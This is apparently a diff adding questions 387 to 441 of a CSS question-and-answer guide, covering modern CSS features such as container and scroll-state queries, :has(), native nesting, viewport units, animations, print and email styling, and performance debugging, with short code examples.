+Newer browser versions also partition visited link history by site, so links only show as visited when they were visited from the same site.
+
+### 387: What are the risks of loading third-party CSS?
+
+A third-party stylesheet can:
+
+- Change or hide anything on the page (fake login forms, hiding warnings).
+- Leak data with attribute selectors and background URLs.
+- Break your layout if the provider changes it.
+- Slow down rendering, since it's render-blocking from another origin.
+
+Self-host when you can. If you load from a CDN, use Subresource Integrity:
+
+```html
+<link rel="stylesheet"
+      href="https://cdn.example.com/lib@1.2.3/lib.min.css"
+      integrity="sha384-..."
+      crossorigin="anonymous">
+```
+
+Also pin exact versions and put vendor CSS in a low-priority cascade layer.
+
+### 388: Why can't a container query check the container's own size, and why is `inline-size` the usual choice?
+
+If an element could style itself based on its own size, a style change could change the size, which changes the style, and so on in a loop. To avoid that:
+
+- You can only query an **ancestor** container, never the element itself.
+- The container gets **size containment**, so its size doesn't depend on its children. That breaks the loop.
+
+With `container-type: size`, the container can't get its height from its children, so it collapses unless you give it a height. With `inline-size`, the width is contained (it usually comes from the parent anyway), and the height still grows with content. That's why `inline-size` is the practical default.
+
+### 389: How can you use style queries for component variants?
+
+Style queries can react to a custom property set by a parent, without adding classes to every child.
+
+```css
+.card { --tone: neutral; }
+.card[data-tone="warning"] { --tone: warning; }
+
+@container style(--tone: warning) {
+  .card__icon { color: darkorange; }
+  .card__title::before { content: "⚠ "; }
+}
+```
+
+This works well for themes and for passing context down, like "this button is inside a dark section". The children don't need to know about the parent's classes. Remember that only custom properties can be queried, and only in browsers that support style queries.
+
+### 390: How do you use `:has()` for state-based styling, and what are the pitfalls?
+
+```css
+/* show a "has errors" state on the form */
+form:has(:user-invalid) .submit { opacity: 0.5; }
+
+/* card is clickable if it contains a primary link */
+.card:has(a.primary) { cursor: pointer; }
+
+/* change layout when a sidebar exists */
+.layout:has(> .sidebar) { grid-template-columns: 250px 1fr; }
+
+/* style the previous sibling */
+li:has(+ li:hover) { scale: 1.05; }
+```
+
+Pitfalls:
+
+- The specificity of `:has()` comes from its argument, so it can be higher than you expect.
+- `:has()` can't be nested inside another `:has()`, and pseudo-elements can't be used inside it.
+- Broad anchors (`body:has(...)`) on pages that change often can be slow.
+- Logic hidden in CSS can surprise people who expect state to live in JavaScript. Document it.
+
+### 391: What is the specificity gotcha with native nesting?
+
+Nested rules act like the parent selector is wrapped in `:is()`. If the parent is a selector list with different specificities, every nested rule gets the **highest** one.
+
+```css
+.button, #legacy-button {
+  & span { color: red; }
+}
+/* same as :is(.button, #legacy-button) span → specificity (1,0,1) for both */
+```
+
+Now a `.button span` override elsewhere (0,1,1) loses even for normal buttons. Sass would have output `.button span, #legacy-button span`, each with its own specificity. Keep parent selectors in nesting simple and similar.
+
+### 392: What are the pitfalls of where you put `&` in nested rules?
+
+`&` can go anywhere, which changes the meaning:
+
+```css
+.card {
+  .theme-dark & { background: #111; }  /* .theme-dark .card */
+  & & { margin: 0; }                   /* .card .card (nested cards) */
+  &--compact { }                       /* does NOT mean .card--compact */
+  :hover > & { }                       /* :hover > .card */
+}
+```
+
+Things to watch:
+
+- Placing `&` at the end flips the relationship: the parent becomes the descendant.
+- Native CSS can't join strings, so BEM-style `&__title` or `&--compact` doesn't work. Teams moving from Sass often hit this.
+- Declarations written after nested rules in the same block used to be moved up silently. The spec now keeps them in order (`CSSNestedDeclarations`), but older browser versions still move them.
+
+### 393: How do `@import` with `layer()`, `supports()` and media conditions work together?
+
+```css
+@import url("theme.css") layer(theme) supports(color: oklch(0 0 0)) (prefers-color-scheme: dark);
+```
+
+Order matters: URL, then `layer`, then `supports()`, then media queries. The file is loaded as part of layer `theme` only if the browser supports `oklch` and the media query matches. An anonymous `layer` with no name puts it in its own unnamed layer.
+
+All `@import` rules must come before other rules, after `@charset` and `@layer` statements. Each import is still a separate request in the browser, so bundle them at build time.
+
+### 394: How do you share breakpoints between CSS and JavaScript?
+
+Custom properties can't be used inside media query conditions, so you need another approach:
+
+- Keep breakpoints in a JSON or TS file and generate both Sass variables or `@custom-media` (with PostCSS) and a JS module from it.
+- In JavaScript, use `matchMedia` with the same query strings:
+
+```js
+const md = window.matchMedia("(width >= 768px)");
+md.addEventListener("change", (e) => setIsDesktop(e.matches));
+```
+
+- For component-level behavior, prefer container queries in CSS and `ResizeObserver` in JS, so you don't need viewport breakpoints in JS at all.
+
+### 395: When do you use `matchMedia`, `ResizeObserver` or container queries?
+
+- **Container queries**: purely visual changes based on a component's size. No JavaScript, so this is the first choice.
+- **`ResizeObserver`**: JavaScript needs the size of an element, for example to pick a chart's tick count or to virtualize a list.
+- **`matchMedia`**: JavaScript needs to know about viewport or user settings, like rendering a different component on mobile or respecting reduced motion in a JS animation.
+
+Avoid `resize` event listeners that read layout every time they fire. Both observers batch their callbacks and avoid layout thrashing.
+
+### 396: How do CSS animations compare to JavaScript animations?
+
+- **CSS transitions and animations**: declarative and simple. Browsers can run `transform` and `opacity` on the compositor even when the main thread is busy. Hard to control in real time.
+- **Web Animations API (WAAPI)**: the same engine as CSS animations, controlled from JS (`el.animate()`, `pause()`, `reverse()`, `finished` promise). Also runs on the compositor.
+- **`requestAnimationFrame` libraries** (old-style GSAP, custom code): full control, physics and sequencing, but they run on the main thread, so they can jank when the page is busy. Modern GSAP and Motion use WAAPI where they can.
+
+Use CSS for state changes, WAAPI for animations JS needs to control, and libraries for complex timelines.
+
+### 397: What does `animation-composition` do?
+
+It sets how an animation's value combines with the element's underlying value, or with other animations of the same property.
+
+- `replace` (default): the animation value replaces the base value.
+- `add`: the values are added together. For transforms, the functions are appended.
+- `accumulate`: the values are combined numerically (`translateX(10px)` + `translateX(20px)` = `translateX(30px)`).
+
+```css
+.shake {
+  transform: rotate(10deg);
+  animation: nudge 300ms;
+  animation-composition: add; /* keeps the 10deg rotation while nudging */
+}
+@keyframes nudge {
+  50% { transform: translateX(5px); }
+}
+```
+
+It's Baseline since 2023.
+
+### 398: What is a CSS motion path?
+
+`offset-path` moves an element along a path, and `offset-distance` sets how far along it is.
+
+```css
+.dot {
+  offset-path: path("M 0 100 C 100 0, 200 200, 300 100");
+  offset-rotate: auto; /* faces the direction of travel */
+  animation: travel 3s ease-in-out infinite alternate;
+}
+@keyframes travel {
+  from { offset-distance: 0%; }
+  to   { offset-distance: 100%; }
+}
+```
+
+`offset-path` also accepts basic shapes like `circle()`, `ray()` and `url(#svg-path)`. Newer browsers support `shape()` too, which makes paths responsive.
+
+### 399: What are scroll-state container queries?
+
+They let CSS react to scroll-related state of a container, like whether a sticky element is stuck, a snap item is snapped, or a container can scroll.
+
+```css
+.header {
+  position: sticky;
+  top: 0;
+  container-type: scroll-state;
+}
+
+@container scroll-state(stuck: top) {
+  .header-inner { box-shadow: 0 2px 8px rgb(0 0 0 / 15%); }
+}
+```
+
+Before this, you needed an `IntersectionObserver` with a sentinel element to detect "stuck". It's Chromium-only so far (since 133), so treat it as an extra on top of a working base.
+
+### 400: What is scroll anchoring?
+
+When content above the visible area changes size (like images or ads loading), browsers adjust the scroll position so the content the user is reading doesn't jump. This is scroll anchoring, and it's on by default in Chromium and Firefox. Safari support came later, so check caniuse if you rely on it.
+
+```css
+.chat-log { overflow-anchor: none; } /* turn it off where you manage scroll yourself */
+```
+
+Turn it off for chat windows or infinite feeds where your own code controls scroll position, otherwise the two can fight.
+
+### 401: How do you keep a large CSS codebase maintainable?
+
+- **Linting**: Stylelint with rules for max specificity, no ids, allowed units, and logical properties.
+- **Structure**: cascade layers plus a clear folder layout (tokens, base, components, utilities).
+- **Scoping**: component styles live next to components (CSS Modules, `@scope` or similar), so deleting a component deletes its CSS.
+- **Tokens only**: no raw colors or random spacing values in components. Lint for hex values outside token files.
+- **Dead code checks**: coverage reports and unused-selector tools in CI.
+- **Visual regression tests**: screenshot diffs (Playwright, Chromatic) catch side effects that code review misses.
+- **Documentation**: a living style guide or Storybook showing every component state.
+
+### 402: How should a component library write its CSS so apps can customise it?
+
+- Keep specificity low: wrap selectors in `:where()`, or ship styles in a named layer (`@layer ui-lib`) so app styles win without `!important`.
+- Expose **custom properties** as the public styling API (`--button-bg`, `--button-radius`) and document them.
+- Use `::part()` for web components, and stable `data-*` or class hooks for others.
+- Don't ship global resets or element selectors that affect the host app.
+- Avoid hard-coded `z-index`. Use the top layer for overlays.
+- Support `color-scheme`, logical properties, `prefers-reduced-motion` and forced colors by default.
+
+### 403: How do you build a fluid spacing and type scale?
+
+Interpolate between a minimum and maximum value across a viewport range, using `clamp()`:
+
+```css
+:root {
+  /* 16px at 320px viewport, 20px at 1240px viewport */
+  --step-0: clamp(1rem, 0.913rem + 0.435vw, 1.25rem);
+  /* 20px to 28px */
+  --step-1: clamp(1.25rem, 1.076rem + 0.87vw, 1.75rem);
+  --space-s: clamp(1rem, 0.913rem + 0.435vw, 1.25rem);
+  --space-m: clamp(1.5rem, 1.37rem + 0.652vw, 1.875rem);
+}
+```
+
+The middle value comes from the line between the two points: `slope = (max - min) / (maxVw - minVw)`, then `intercept = min - slope × minVw`. Tools like Utopia generate full scales. Keep a `rem` part in the middle value so zoom still works. You can use `cqi` instead of `vw` to make the scale follow the container.
+
+### 404: When do you choose CSS backgrounds versus `<img>`/`<picture>` for responsive images?
+
+- **Content images** (product photos, the hero image as LCP): use `<img>` with `srcset`/`sizes`, or `<picture>` for different crops. The browser's preload scanner finds them early, they get alt text, and `loading="lazy"` and `fetchpriority` work.
+- **Decorative images** (textures, patterns): use CSS backgrounds with `image-set()` and media queries.
+- **Art direction** (a different crop on mobile): `<picture>` with `<source media>` is better than swapping backgrounds, because only one image downloads and it's in the HTML.
+
+`object-fit` and `object-position` give `<img>` the same cropping control that `background-size: cover` gives backgrounds.
+
+### 405: What advanced print features does CSS have?
+
+```css
+@page {
+  size: A4 portrait;
+  margin: 2cm 1.5cm;
+
+  @bottom-right {
+    content: "Page " counter(page) " of " counter(pages);
+  }
+}
+@page :first { margin-top: 4cm; }
+@page landscape-table { size: A4 landscape; }
+
+.wide-table { page: landscape-table; }
+```
+
+Margin boxes (`@top-center`, `@bottom-right` and so on) and named pages are newer in browsers. Chromium supports them, and other browsers have less support. Tools like Paged.js or PDF engines (Prince, WeasyPrint) support them fully, so complex PDF reports are often built with HTML and CSS through those tools.
+
+### 406: Why is CSS for emails different?
+
+Email clients have their own, often very old, rendering engines. Outlook on Windows uses Microsoft Word's engine. Common limits:
+
+- `<style>` blocks may be stripped, so styles are inlined on each element (tools like Juice or MJML do this).
+- No flexbox or grid in many clients. Layouts are built with nested `<table>`s.
+- Limited or no support for custom properties, media queries (support varies), `position`, and web fonts.
+- Background images need VML hacks for Outlook.
+
+Use a framework like MJML or React Email that compiles to email-safe HTML, and test with tools like Litmus or Email on Acid.
+
+### 407: How do you decide which browsers to support?
+
+- Look at your real analytics, not global numbers. A B2B tool for banks and a consumer app in India have very different audiences.
+- Set a `browserslist` config shared by your build tools (Autoprefixer, Lightning CSS, Babel):
+
+```
+> 0.5%, last 2 versions, not dead, Firefox ESR
+```
+
+- Or target Baseline: `browserslist` supports queries like `baseline widely available`.
+- Agree on what "support" means: fully working, or working with a simpler look (progressive enhancement).
+- Write the policy down, so feature decisions don't get argued from scratch every time.
+
+### 408: Why are CSS polyfills hard to write?
+
+CSS features are part of the browser's style and layout engine. A polyfill in JavaScript has to:
+
+1. Download and parse the CSS again, because browsers throw away rules they don't understand.
+2. Find matching elements and watch for DOM changes.
+3. Recalculate on resize, scroll or state changes, on the main thread.
+
+That's slow, often incomplete, and can cause flicker. Some features can be compiled away at build time instead (nesting, `oklch()` with fallbacks, media range syntax via PostCSS or Lightning CSS). For layout features like container queries or anchor positioning, polyfills exist but have limits. Progressive enhancement is usually better than polyfilling.
+
+### 409: How do you detect CSS support from JavaScript?
+
+```js
+if (CSS.supports("anchor-name", "--a")) {
+  // use CSS anchor positioning
+} else {
+  // load a positioning library
+}
+
+CSS.supports("display: grid");               // single string form
+CSS.supports("selector(:has(a))");           // selectors
+```
+
+`CSS.supports()` uses the same parser as `@supports`. It checks if the browser **parses** the value, not if the feature fully works. A browser could parse a property but have bugs in it.
+
+### 410: What does `@supports selector()` let you do?
+
+It checks if a selector is supported, so you can use new selectors safely:
+
+```css
+/* fallback: JS adds .has-image */
+.card.has-image { padding: 0; }
+
+@supports selector(:has(img)) {
+  .card:has(img) { padding: 0; }
+}
+```
+
+This matters because an unsupported selector in a list makes the whole rule invalid. Wrapping it in `@supports selector()` or using the forgiving `:is()` stops it from breaking other selectors.
+
+### 411: A page has a horizontal scrollbar on mobile. How do you find the cause?
+
+1. In DevTools, run this in the console to list elements wider than the viewport:
+
+```js
+[...document.querySelectorAll("*")].filter(
+  (el) => el.getBoundingClientRect().right > document.documentElement.clientWidth
+);
+```
+
+2. Chrome's Elements panel shows a "scroll" badge on scroll containers. Also check the Layout pane.
+3. Typical causes: `width: 100vw` (includes the scrollbar), a fixed-width element, long unbroken text or URLs, a negative margin, a transformed element off-screen, a `pre` or `table` without `overflow-x: auto`, or a grid column with an `auto` minimum.
+4. Fix the cause. `overflow-x: hidden` on `body` hides the symptom, and it can break `position: sticky`. Use `overflow-x: clip` if you must.
+
+### 412: Why does a `100vh` section cut off content on mobile, and how do you fix it?
+
+On mobile browsers, `100vh` equals the **largest** viewport (with toolbars hidden). When the toolbars are showing, the bottom part of a `100vh` section is hidden behind them.
+
+```css
+.hero {
+  min-height: 100vh;   /* fallback */
+  min-height: 100svh;  /* fits the smallest visible viewport */
+}
+```
+
+Use `svh` for things that must fit on screen, `lvh` for backgrounds that can be cut off, and `dvh` only when you want it to follow the toolbar (it can cause layout jumps while scrolling). Use `min-height` instead of `height` so content can still grow.
+
+### 413: How do you handle hover styles that "stick" on touch devices?
+
+On touch screens, a tap triggers `:hover`, and it can stay until the user taps somewhere else. Wrap hover-only effects in a media query:
+
+```css
+@media (hover: hover) and (pointer: fine) {
+  .card:hover { translate: 0 -4px; box-shadow: var(--shadow-lg); }
+}
+.card:active { scale: 0.98; } /* feedback for touch */
+```
+
+Never put essential actions behind hover only. Make sure there's always a visible or focusable way to reach them.
+
+### 414: How do you lock page scroll when a modal is open without layout shift?
+
+```css
+html:has(dialog[open]:modal) {
+  overflow: hidden;
+  scrollbar-gutter: stable; /* keeps the scrollbar space so content doesn't move */
+}
+
+dialog {
+  overscroll-behavior: contain;
+  max-height: 85dvh;
+  overflow: auto;
+}
+```
+
+Older approaches added padding equal to the scrollbar width with JavaScript. `scrollbar-gutter: stable` removes the need for that. On iOS Safari, `overflow: hidden` on the root has historically not stopped touch scrolling, which is why some libraries still use `position: fixed` on `body` and restore the scroll position afterward.
+
+### 415: Animations stutter on cheap Android phones. How do you investigate?
+
+1. Record in the Performance panel with CPU throttling, or better, use remote debugging on the real device.
+2. Look for long frames. Is the time in scripting, style, layout or paint?
+3. Check what's animated. Only `transform` and `opacity` should animate. Layout properties, `box-shadow` or `filter: blur()` on large areas are expensive.
+4. Turn on **paint flashing** and **layer borders** to spot big repaints and too many layers.
+5. Check for `backdrop-filter`, large fixed backgrounds, or huge images being scaled.
+6. Reduce the work: smaller animated areas, fake shadows with a pseudo-element whose `opacity` animates, drop blur on mobile, and respect `prefers-reduced-motion`.
+
+### 416: After adding `:has()` selectors, style recalculation got slow. What do you do?
+
+1. Record a Performance trace, find the long "Recalculate Style" blocks, and turn on "Enable CSS selector stats" in Chrome to see which selectors are expensive.
+2. Look for broad anchors, like `body:has(.modal-open)` or `:has()` on elements with huge subtrees, combined with frequent DOM changes (timers, live data, hover).
+3. Make the anchor closer and more specific (`.modal-root:has(> dialog[open])`) and use `>` or `+` inside `:has()` instead of a descendant search.
+4. If a state changes often, toggling a class or data attribute from JavaScript may be cheaper than a `:has()` check over a big tree.
+5. Measure again after each change.
+
+### 417: A third-party widget is breaking your styles, or your styles are breaking it. What are your options?
+
+**Your styles leak into the widget:**
+
+- Scope your global styles (avoid bare element selectors, or use `:where(.app) a`).
+- Put your styles in layers and leave the widget's CSS unlayered, or the other way round, so you control which wins.
+- If the widget supports Shadow DOM or an iframe, use it.
+
+**The widget leaks into your app:**
+
+- Load its CSS into a low-priority layer: `@import url("widget.css") layer(vendor);`.
+- If it uses `!important` or global resets, render it inside an iframe or a shadow root.
+- As a last resort, override with more specific selectors or `all: revert-layer` on a wrapper.
+
+### 418: How do you handle images and shadows in dark mode?
+
+- **Shadows**: dark shadows on a dark background are invisible. Use lighter surface colors to show elevation instead, or use subtle light borders.
+- **Images**: very bright photos can be harsh. You can dim them slightly:
+
+```css
+@media (prefers-color-scheme: dark) {
+  img:not([src$=".svg"]) { filter: brightness(0.9); }
+}
+```
+
+- **Logos and icons**: provide dark versions with `<picture><source media="(prefers-color-scheme: dark)">`, or use SVG with `currentColor`.
+- **Pure black backgrounds**: they cause smearing on OLED screens when scrolling and look harsh. Use a dark gray like `#121212`.
+- **Contrast**: check each token pair again in dark mode. A color that passes on white often fails on dark gray.
+
+### 419: How do you make cards in a row line up their titles, text and buttons?
+
+Use subgrid, so each part of every card shares the same row tracks:
+
+```css
+.cards {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(min(18rem, 100%), 1fr));
+  gap: 1.5rem;
+}
+.card {
+  display: grid;
+  grid-row: span 3;
+  grid-template-rows: subgrid;
+  gap: 0.75rem;
+}
+/* card children: .card__title, .card__body, .card__actions */
+```
+
+Each row's height is set by the tallest title, body or footer in that row of cards. Without subgrid, the fallback is a column flexbox with `margin-top: auto` on the actions, which aligns buttons but not titles.
+
+### 420: How do you make a data table work on small screens?
+
+Options, from simple to complex:
+
+1. **Horizontal scroll**: wrap it with `overflow-x: auto`, and make the first column sticky. Simple, and it keeps the table's meaning.
+
+```css
+.table-scroll { overflow-x: auto; }
+.table-scroll th:first-child,
+.table-scroll td:first-child { position: sticky; left: 0; background: var(--bg); }
+```
+
+2. **Stacked cards**: on small screens, show each row as a block and use `data-label` with `::before` for column names. This breaks the table semantics if you change `display` on table elements, so add ARIA roles back (`role="table"`, `role="row"`, `role="cell"`).
+3. **Hide less important columns** with container queries and offer a way to show them.
+
+Option 1 is usually the best default.
+
+### 421: A layout with a sidebar breaks when the sidebar content is wide. How do you fix it?
+
+```css
+.layout {
+  display: grid;
+  grid-template-columns: minmax(0, 16rem) minmax(0, 1fr);
+}
+
+/* or, with intrinsic wrapping and no media query */
+.with-sidebar {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 1rem;
+}
+.with-sidebar > .sidebar { flex-basis: 16rem; flex-grow: 1; }
+.with-sidebar > .main { flex-basis: 0; flex-grow: 999; min-width: 60%; }
+```
+
+The second pattern (from "Every Layout") puts the sidebar above the main content when the main area would get narrower than 60%. Both use `minmax(0, …)` or `min-width` to stop wide content from making tracks wider than planned.
+
+### 422: A dropdown inside an `overflow: hidden` card gets cut off. How do you fix it?
+
+`overflow: hidden` clips descendants, unless they're positioned relative to something outside the clipping element. Options:
+
+1. **Top layer**: make the dropdown a `popover`. It escapes all clipping and stacking contexts. Position it with anchor positioning (or a JS library where that isn't supported).
+2. **Portal**: render the dropdown at the end of `body` and position it with JS.
+3. **Change the card**: use `overflow: clip` with `overflow-clip-margin`, or only clip a specific inner element (like the image) instead of the whole card.
+4. Make the dropdown `position: fixed`, but that breaks if an ancestor has a transform.
+
+Option 1 is the modern answer.
+
+### 423: How do you align icons with text?
+
+- **Flexbox** for a button or label with an icon: `display: inline-flex; align-items: center; gap: 0.5em;`.
+- **Inline icons in running text**: size them with `em` and nudge them:
+
+```css
+.icon {
+  width: 1em;
+  height: 1em;
+  vertical-align: -0.125em;
+}
+```
+
+- **Newer units**: `1cap` (cap height) and `1lh` (line height) help size icons to match capital letters or to sit exactly on one line.
+
+```css
+.icon { height: 1cap; width: auto; }
+.list-item::before { height: 1lh; }
+```
+
+Using `em` and `cap` keeps icons aligned when font size changes.
+
+### 424: What are the `lh`, `rlh`, `cap` and `ic` units?
+
+- `lh`: the element's computed `line-height`. `rlh` is the root element's line height.
+- `cap`: the height of capital letters in the current font.
+- `ic`: the width of the CJK "water" ideograph (水), which helps size CJK text.
+- Root versions also exist for other font units: `rem`, `rcap`, `rch`, `rex`, `ric`.
+
+```css
+textarea { min-height: 3lh; }               /* exactly three lines */
+.prose > * + * { margin-top: 1rlh; }        /* vertical rhythm */
+.badge { height: 1cap; }
+```
+
+`lh` and `rlh` are Baseline since 2023. `cap` and the other root font units are newer.
+
+### 425: How do viewport units behave with scrollbars and the on-screen keyboard?
+
+- `100vw` includes the vertical scrollbar on desktop, so `width: 100vw` causes a horizontal scrollbar when the page scrolls vertically. Use `100%` instead. `100dvw` has the same problem, and `scrollbar-gutter` doesn't change `vw`.
+- When the on-screen keyboard opens on mobile, browsers by default resize the **visual** viewport, not the layout viewport. So `dvh` doesn't shrink, and fixed bottom bars may end up behind the keyboard.
+- The viewport meta key `interactive-widget=resizes-content` makes the layout viewport shrink instead (Chromium and Firefox), so `dvh` and fixed elements adjust.
+
+```html
+<meta name="viewport" content="width=device-width, initial-scale=1, interactive-widget=resizes-content">
+```
+
+The JavaScript `visualViewport` API gives exact sizes when CSS isn't enough.
+
+### 426: What does the CSS `zoom` property do now?
+
+`zoom` scales an element **and** its layout space. `transform: scale()` only scales it visually, while the original space stays the same. It used to be non-standard (old IE and WebKit), but it was standardized and Firefox added it in 2024, so it now works in all major browsers.
+
+```css
+.preview { zoom: 0.5; }   /* takes half the space, unlike scale(0.5) */
+```
+
+It's handy for thumbnails and previews. Be careful: it affects all lengths inside, and how it interacts with things like `getBoundingClientRect()` was cleaned up only recently.
+
+### 427: How do you choose between cascade layers, `@scope` and CSS Modules?
+
+They solve different problems and work well together:
+
+- **CSS Modules**: unique class names at build time. They stop name collisions between components. Needs a bundler.
+- **`@scope`**: limits where selectors apply in the DOM (with an optional lower limit) and adds proximity. Good for styling markup you don't fully control, like CMS content. No build step.
+- **Cascade layers**: decide which **group** of styles wins (reset vs components vs utilities vs vendor). They don't scope anything, they set priority.
+
+A common modern setup: layers for overall order, CSS Modules (or a utility framework) for components, and `@scope` for prose or embedded content.
+
+### 428: How would you migrate a large Sass codebase to modern CSS?
+
+Do it in steps, not as a big rewrite:
+
+1. Move from Sass `@import` to `@use`/`@forward` (the Sass migrator does most of it), because `@import` is going away.
+2. Turn Sass color and spacing variables into **CSS custom properties** generated from tokens. Sass can still emit them during the move.
+3. Replace Sass color functions (`darken`, `lighten`) with `color-mix()` or relative color syntax.
+4. Introduce **cascade layers** around existing groups of files to tame specificity.
+5. Replace nesting gradually with native nesting, avoiding BEM string joining (`&__`), which has no native equivalent.
+6. Keep Sass where it still adds value (loops, mixins, build-time logic), or drop it once nothing needs it.
+7. Run visual regression tests at each step.
+
+### 429: What do you look for when reviewing a CSS pull request?
+
+- **Specificity and scope**: no ids, no deep selectors, no new global element styles, and `!important` only with a reason.
+- **Tokens**: no raw colors, sizes or `z-index` numbers that bypass the design system.
+- **Layout**: works at narrow and wide sizes, with long text, with no content, and with different languages.
+- **Accessibility**: focus styles, contrast, reduced motion, forced colors, and visual order matching DOM order.
+- **Performance**: animating cheap properties, no huge `will-change`, no large background images in CSS for the LCP.
+- **Browser support**: new features have fallbacks or `@supports`.
+- **Dead code**: removed markup has its CSS removed too.
+
+Ask for screenshots or a preview link. CSS is much easier to review when you can see it.
+
+### 430: How do you measure CSS performance?
+
+- **Performance panel** (Chrome DevTools): look at time spent in "Recalculate Style", "Layout", "Paint" and "Composite Layers" during load and interactions. Turn on selector stats to find expensive selectors.
+- **Coverage tab**: unused CSS bytes.
+- **Rendering panel**: paint flashing, layout shift regions, layer borders and the FPS meter.
+- **Lighthouse / PageSpeed Insights**: render-blocking resources, unused CSS, CLS and LCP.
+- **Real user data**: Core Web Vitals from CrUX or your RUM tool, especially INP and CLS.
+- **Bundle size**: track CSS size in CI so it doesn't grow without anyone noticing.
+
+### 431: How can CSS affect Interaction to Next Paint (INP)?
+
+INP measures how long it takes from a user interaction to the next frame being painted. CSS adds to that time when an interaction causes:
+
+- Large style recalculations, like toggling a class on `body` or `html` that many selectors depend on, or changing an inherited custom property at the root.
+- Big layout work, like opening a menu that pushes the whole page down, or a huge DOM with no containment.
+- Expensive paint, like large blurs, shadows or `backdrop-filter`.
+
+Fixes: toggle state as close to the affected element as you can, use `contain`/`content-visibility` for heavy sections, register frequently-changed custom properties with `inherits: false`, and keep interaction feedback cheap (a `transform` or `opacity` change).
+
+### 432: What is the `shape()` function?
+
+`shape()` describes a path like SVG's `path()`, but with CSS syntax and units. You can use `%`, `rem`, `calc()` and custom properties, so shapes can be responsive.
+
+```css
+.wave {
+  clip-path: shape(
+    from 0 0,
+    line to 100% 0,
+    line to 100% 85%,
+    curve to 0 85% with 50% 100%,
+    close
+  );
+}
+```
+
+`path()` only accepts fixed pixel coordinates, so it doesn't scale with the element. `shape()` works in `clip-path` and `offset-path`. It's in Chromium and Safari and is part of Interop 2026.
+
+### 433: What is the difference between computed, used and resolved values?
+
+- **Specified value**: what the cascade picks, or the inherited or initial value.
+- **Computed value**: the specified value turned into an absolute form where possible, without doing layout. `em` becomes `px`, and relative URLs become absolute. Percentages for `width` stay percentages. This is what children inherit.
+- **Used value**: the final value after layout, like `width: 50%` becoming `437.5px`.
+- **Actual value**: the used value after rounding to device pixels or fitting font limits.
+- **Resolved value**: what `getComputedStyle()` returns. For most properties it's the computed value, but for layout properties like `width`, `height`, `margin` and `top`, it's the used value.
+
+This explains why `getComputedStyle(el).width` gives pixels even when you wrote a percentage, and why reading it can force layout.
+
+### 434: Why does inheritance use the computed value, and when does that cause bugs?
+
+Children inherit the parent's **computed** value, not the specified one. Examples where that matters:
+
+- `line-height: 1.5em` on a parent computes to a pixel value, and children with bigger fonts inherit that small fixed number. `line-height: 1.5` (unitless) is inherited as the number, so it works.
+- `font-size: 2em` nested several levels gets bigger and bigger, because each level is relative to the parent's computed size. `rem` avoids this.
+- Custom properties inherit their computed value too. If `--size: calc(var(--base) * 2)` is set on `:root`, changing `--base` on a child doesn't change `--size` there. Define derived variables on the element where you change the base, or use `*` (with care).
+
+### 435: How does a CSS-only toggle (checkbox hack) compare to modern options?
+
+The old "checkbox hack" used a hidden checkbox and `:checked ~ .panel` to toggle things without JavaScript. It had accessibility problems: wrong semantics, and keyboard and screen reader confusion.
+
+Modern options give you the same "no JS" behavior with proper semantics:
+
+- `<details>`/`<summary>` for disclosure and accordions (with `name` for exclusive groups).
+- `popover` with `popovertarget` for menus and tooltips.
+- `<dialog>` with invoker commands (`command="show-modal"`, `commandfor`), which are newer.
+- `:has()` to style a parent based on a real form control's state.
+
+Use these instead of hacks, because they come with keyboard support and correct roles for free.
+
+### 436: How do you build a sticky element that changes appearance when it gets stuck?
+
+In Chromium you can use a scroll-state container query (see question 399). For all browsers:
+
+```css
+.header { position: sticky; top: -1px; }
+.header.is-stuck { box-shadow: 0 2px 8px rgb(0 0 0 / 15%); }
+```
+
+```js
+const header = document.querySelector(".header");
+new IntersectionObserver(
+  ([entry]) => header.classList.toggle("is-stuck", entry.intersectionRatio < 1),
+  { threshold: [1] }
+).observe(header);
+```
+
+The `top: -1px` trick makes the header go 1px outside the viewport when stuck, so the observer sees it as no longer fully visible.
+
+### 437: How do `transition` and `@starting-style` handle elements added to the DOM?
+
+When an element is first rendered (inserted, or changed from `display: none`), there's no "before" style, so transitions don't run. `@starting-style` gives the browser the values to transition **from** on that first style update.
+
+```css
+.list-item {
+  opacity: 1;
+  translate: 0 0;
+  transition: opacity 250ms, translate 250ms;
+
+  @starting-style {
+    opacity: 0;
+    translate: 0 8px;
+  }
+}
+```
+
+New items now fade in when JavaScript appends them, with no class toggling or `requestAnimationFrame` tricks. `@starting-style` only applies on that first style change. It's Baseline since 2024. For exit animations of removed elements you still need JavaScript (or a view transition), because a removed element is gone right away.
+
+### 438: How do you stagger an animation over a list in CSS?
+
+```css
+/* modern (where supported) */
+.list > li {
+  animation: fade-up 400ms both;
+  animation-delay: calc((sibling-index() - 1) * 60ms);
+}
+
+/* portable: index set in HTML or JS */
+.list > li {
+  animation: fade-up 400ms both;
+  animation-delay: calc(var(--i, 0) * 60ms);
+}
+```
+
+```html
+<li style="--i: 0">...</li>
+<li style="--i: 1">...</li>
+```
+
+Keep the total delay short (cap it for long lists, for example with `min()`), otherwise the last items feel slow. Turn it off for `prefers-reduced-motion`.
+
+### 439: What are `:open`, `:popover-open` and `:modal`?
+
+They are state pseudo-classes for elements that open and close:
+
+- `:open`: matches `<details>`, `<dialog>`, `<select>` (when its picker is shown) and `<input>` pickers while open. It's newer and not in every browser yet. Use `[open]` as a fallback for details and dialog.
+- `:popover-open`: matches a popover that is showing.
+- `:modal`: matches a dialog opened with `showModal()` or an element in fullscreen. It's useful because a dialog opened with `show()` is also `[open]` but isn't modal.
+
+```css
+dialog:modal { box-shadow: 0 30px 80px rgb(0 0 0 / 40%); }
+details:is([open], :open) > summary { font-weight: bold; }
+```
+
+### 440: What is the `reading-flow` property?
+
+When you reorder items with grid placement, `order` or `flex-direction: row-reverse`, the visual order no longer matches the DOM order. Tab focus then jumps around. `reading-flow` tells the browser to follow the visual order for focus navigation and screen readers.
+
+```css
+.grid {
+  display: grid;
+  grid-auto-flow: dense;
+  reading-flow: grid-rows;
+}
+.toolbar {
+  display: flex;
+  flex-direction: row-reverse;
+  reading-flow: flex-visual;
+}
+```
+
+It shipped in Chromium (137). The safest option is still to keep the DOM order and the visual order the same.
+
+### 441: How does `color-scheme` affect elements and iframes?
+
+- It tells the browser which schemes the page supports. Built-in UI like scrollbars, form controls, the default canvas background and `light-dark()` follow the chosen scheme.
+- It inherits, so you can set it on a section to force light or dark inside it.
+- A `<meta name="color-scheme" content="light dark">` tag in `<head>` lets the browser pick the right background color **before** CSS loads, which avoids a white flash in dark mode.
